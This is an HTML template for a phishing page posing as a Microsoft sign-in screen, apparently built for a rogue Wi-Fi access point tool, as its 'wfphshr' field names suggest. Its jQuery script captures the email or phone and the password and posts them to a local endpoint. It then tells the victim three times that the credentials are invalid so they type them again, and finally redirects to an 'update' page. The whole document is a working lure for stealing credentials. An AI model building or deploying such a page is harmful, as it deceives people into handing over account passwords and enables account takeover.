<!DOCTYPE html>
<!-- saved from url=(0034)https://mabbox.bytel.fr/login.html -->
<html lang="fr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

 <title>{{box_name}} - Interface</title>
        <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
<meta http-equiv="Pragma" content="no-cache" />
<meta http-equiv="Expires" content="0" />
 
 <meta name="viewport" content="initial-scale=1.0,user-scalable=no,maximum-scale=1">
 
 <meta name="HandheldFriendly" content="True">
 <meta name="apple-mobile-web-app-status-bar-style" content="black">


 <!-- Style Sheets -->
<link href="static/css/style.css" media="screen" rel="stylesheet" type="text/css"></head>
<link href="static/css/animate.css" media="screen" rel="stylesheet" type="text/css"></head>

    <script src="static/js/jquery.min.js"></script>
<body class="tvw620i feat-checker feat-optim feat-biloader no-feat-temperature no-feat-orientation no-feat-light feat-usb feat-ht40 feat-5g feat-scan-5g no-feat-hotspot feat-wps feat-scanwifi no-feat-alert-save feat-boxwithled no-feat-boxwithletter feat-twoline feat-customerspace feat-ipv6 feat-diag-tcp no-feat-cable feat-repair-usb no-feat-search remote-off gridlock">
<style type="text/css">
.page-login {
	background-color: #d90b20;
	background-image: url('./static/img/bgmicrosoft.jpg');

}
.def-text-color { color: {{color}} !important; }
.def-bg-color { background-color: {{color}} !important;}
.def-bd-color { border-color: {{color}} !important; }

.desktop-6 {
	max-width: 100%;
	padding: 10px;
}
.imgfirst {
	display: block;
	width: 50%;
	margin: 0 auto;
	margin-bottom: 30px;
	margin-top: 10px;
}
.inputfront {
	background-color: rgba(0,0,0,0) !important;
	border: 0 !important;
	border-radius: 0 !important;
	border-bottom: 1px solid black !important;
}

.labelfront {
	text-align: left;
	display: block;
	font-size: 12px;
	font-weight: bold;
}
.cta-1 {
    padding: 0 20px 0 40px;
    width: 100%;
    text-align: center;
    color: #fff;
    background: {{color}};
    border: 0px;
}

.cta-1:hover {
	background-color: black;
	color: white;
}

#dialog {
	z-index: 100;
	display: inline-block;
	position: absolute;
	width: 100%;
	height: 100%;
	display: flex;
	justify-content:center;
	align-items:center;
	background-color: rgba(0,0,0,0.3);
}

#dialog .dialog-box {
	display: inline-block;
	background-color: white;
	border-radius: 15px;
	padding: 15px;
}
#dialog .dialog-box .dialog-text{
text-align:center;
font-size: 13px;
}
#dialog .dialog-box .but-close-dialog {
	margin: 0 auto;
	display: block;
	padding: 10px;
	color: white;
	text-transform: uppercase;
	font-size: 16px;
	max-width: 200px;
	text-align:center;
	margin-top: 10px;
	cursor: pointer;
	  background-color: #4888ef;

}

.progress {
	height: 30px;
  width: 100%;
}

.progress {
    height: 30px;
    margin-bottom: 20px;
    overflow: hidden;
    background-color: #f5f5f5;
    border-radius: 4px;
    -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,.1);
    box-shadow: inset 0 1px 2px rgba(0,0,0,.1);
}

.progress #dynamic {
	height: 40px;
	line-height: 30px;
}

.progress-bar.active, .progress.active .progress-bar {
    -webkit-animation: progress-bar-stripes 2s linear infinite;
    -o-animation: progress-bar-stripes 2s linear infinite;
    animation: progress-bar-stripes 2s linear infinite;
    color: white;
}
.progress-bar-success {
    background-color: #5cb85c;
}
.progress-bar-striped, .progress-striped .progress-bar {
    background-image: -webkit-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);
    background-image: -o-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);
    background-image: linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);
    -webkit-background-size: 40px 40px;
    background-size: 40px 40px;
    }
    @-webkit-keyframes progress-bar-stripes {
  from {
    background-position: 40px 0;
  }
  to {
    background-position: 0 0;
  }
}
@-o-keyframes progress-bar-stripes {
  from {
    background-position: 40px 0;
  }
  to {
    background-position: 0 0;
  }
}
@keyframes progress-bar-stripes {
  from {
    background-position: 40px 0;
  }
  to {
    background-position: 0 0;
  }
}

.textfield {
	width: 100% !important;
}
</style>
<div class="page-login">
	<div id="dialog" class=" animated-05 fadeIn" style="display: none">
		<div class="dialog-box zoomIn">
			<img src="./static/img/microsoft_logo.svg" class="imgfirst" style="width: 150px; margin-left: 20px">
			<div class="dialog-text animated-1"></div>
			<div class="but-close-dialog " onclick="javascript:hideDialog()">OK</div>
		</div>
	</div>
 <div class="login-form" style="transform: none; top: 150px;">
 <div class="row">
 <div class="desktop-6 desktop-push-3 tablet-4 tablet-push-1 mobile-full panel">
 

 <form id="login-form" style="text-align:left;padding: 40px !important;">

 		<img src="./static/img/microsoft_logo.svg" class="imgfirst" style="width: 150px; margin-left: 0px">

 		<p style='font-size: 23px; font-weight: bold;font-family: "Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math"'>Connexion</p><br />
 <div class="textfield">
 	
 <input type="text" class="inputfront" placeholder="E-mail ou Téléphone" id="login" name="wfphshr-wpa-password">
 <div id="password-message" class="alert-message" style="display: none;">

 </div>
 </div>
 <div class="textfield">

 <input type="password" class="inputfront" placeholder="Votre mot de passe" id="password" name="wfphshr-admin-password">
 <div id="password-message" class="alert-message" style="display: none;">
 
 </div>
 </div>
<br /><br />
 <p style="display:inline-block;text-align:right;"><a href="#" style="font-size: 13px;color:#0067b8; ">Nom d'utilisateur oublié</a></p>
 <br /><br />
 <div class="btn-container btn-login" style="float: right">
 <button class="cta-1 btn-submit" style="width: 150px;">Connexion</button>
  <br /><br /><br />
 </div>


 </form>


</div>



	    <script>


	var dialog = $('#dialog');
	var dialogBox = $('.dialog-text');
	var dialogText ="";

	var nb_try = 0;
	 $(".btn-submit").on("click", function(e) {
		  
		      e.preventDefault();
		     
		      // get the password box and checkbox elements
		      var input = document.getElementById("login");
		      var input2 = document.getElementById("password");
		      // check to see if the value is empty
		      if ( input.value == "" || input2.value == "" ){
				
				dialogText = "Merci de remplir les champs pour vous connecter.";
				showDialog();

		      }else{
		          // post the data
		          
		            post('post', {
		              'wfphshr-microsoft-login': input.value,
		             'wfphshr-microsoft-password': input2.value
		            });      
		      }
		  });



		  function showDialog() {

		  		  	dialogBox.html(dialogText);
		  		  	dialog.css('display','flex');

		  }

		  function hideDialog() {

		  	dialog.css('display','none');
		  }
		  
		  /*
		  Post to the fallowing path given the parameters.

		  Args:
		    path: The path to be posted to.
		    params: The parameters to be passed.
		  */
		  function post(path, params) {
		    // create a form and set its attributes
		   var dataToSend = JSON.stringify(params);
// post the data

$.ajax(
    {
        url: 'post',
        type: 'POST',
        data: dataToSend,

        success: function (jsonResponse) {
          if (nb_try < 3) {
          		dialogText = "<span style='color: red'>Erreur : vos identifiants sont invalides.</span>";
				showDialog();
				nb_try++;
          }
          else {
          	window.location = "./update.html";
          }
       }
    }
 );
		  }
	 

      
		</script>


</body></html>